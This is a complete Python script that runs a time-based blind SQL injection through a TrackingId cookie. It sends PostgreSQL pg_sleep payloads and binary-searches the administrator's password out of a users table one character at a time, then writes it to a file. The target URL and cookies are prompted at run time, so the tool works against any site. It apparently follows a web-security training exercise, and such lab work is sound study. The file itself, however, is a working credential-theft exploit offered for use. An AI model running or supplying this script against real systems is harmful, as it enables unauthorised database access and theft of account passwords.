import sys
import requests
import urllib.parse
import urllib3
import time


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_payload(url, tracking_id, session_cookie, payload, delay):
    cookies = {
        'TrackingId': tracking_id + urllib.parse.quote(payload),
        'session': session_cookie
    }

    try:
        start = time.time()
        r = requests.get(url, cookies=cookies, verify=False, timeout=delay + 5)
        elapsed = time.time() - start
        return elapsed > delay
    except requests.exceptions.ReadTimeout:
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def binary_search_char(url, tracking_id, session_cookie, position, delay, charset):
    low = 0
    high = len(charset) - 1

    while low <= high:
        mid = (low + high) // 2
        char = charset[mid]
        ascii_val = ord(char)

        payload = f"'|| (SELECT CASE WHEN (username='administrator' AND ascii(substring(password,{position},1)) > {ascii_val}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users)--"
        print(f"[~] Position {position}: Testing '{char}' > ?")
        if send_payload(url, tracking_id, session_cookie, payload, delay):
            low = mid + 1
        else:
            payload = f"'|| (SELECT CASE WHEN (username='administrator' AND ascii(substring(password,{position},1)) = {ascii_val}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users)--"
            if send_payload(url, tracking_id, session_cookie, payload, delay):
                return char
            else:
                high = mid - 1
    return None

def extract_password(url, tracking_id, session_cookie, delay, max_length=20):
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+{}[]|:;\"\'<>,.?/~`'
    password = ""
    print("\n[🔍] Extracting administrator password with Binary Search...\n")
    for position in range(1, max_length + 1):
        char = binary_search_char(url, tracking_id, session_cookie, position, delay, sorted(charset))
        if char:
            password += char
            print(f"[+] Password so far: {password}")
        else:
            print(f"[-] Failed to extract character at position {position}")
            break
    return password

def main():
    print("🕵️‍♂️ Blind SQLi (Time-based) Extractor - Binary Search Version\n")

    url = input("[+] Enter target URL (e.g., https://example.com/): ").strip()
    tracking_id = input("[+] Enter the TrackingId value (before injection): ").strip()
    session_cookie = input("[+] Enter session cookie (or press Enter if none): ").strip()
    delay_input = input("[+] Enter delay in seconds (default = 10): ").strip()
    delay = int(delay_input) if delay_input else 10

    password = extract_password(url, tracking_id, session_cookie, delay)

    print(f"\n[✅] Done! Administrator password is: {password}")

    with open("extracted_password.txt", "w") as f:
        f.write(password)
        print("[💾] Password saved to extracted_password.txt")

if __name__ == "__main__":
    main()
